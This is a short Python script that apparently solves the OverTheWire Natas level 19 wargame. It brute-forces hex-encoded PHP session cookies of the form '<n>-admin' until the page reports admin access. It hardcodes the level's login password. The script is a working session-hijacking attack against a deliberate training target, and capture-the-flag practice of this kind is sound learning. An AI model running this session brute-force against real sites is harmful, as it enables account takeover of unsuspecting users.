import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered_chars = ''
passwordlist= []
exists_str = "You are an admin"
query = {'username' : ''}

natasURL = 'http://natas19.natas.labs.overthewire.org/'

natas_usr   = 'natas19'
natas_pword = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
login=(natas_usr,natas_pword)

#Find the list of chars in pword
for i in range (0,641):
	# Make the cookie we will try
    plain_cookie = (str(i) + "-" + 'admin').encode('utf-8')
    print(plain_cookie)
	# Encode the cookie as a hex
    encoded_cookie = plain_cookie.hex()
    print(encoded_cookie)
    cookie = {"PHPSESSID": encoded_cookie}
    r =    requests.request(method ='POST', url=natasURL , auth=login, cookies=cookie)
    time.sleep(0.1)
    # If I get the password, print out the contents of the webpage, look for the password and save it for the next level.
    if "You are an admin" in r.text:
        print("Session id is %d" %i)
        print(r.content)
        break
    else:
        print("%d is not the session id." %i)
    

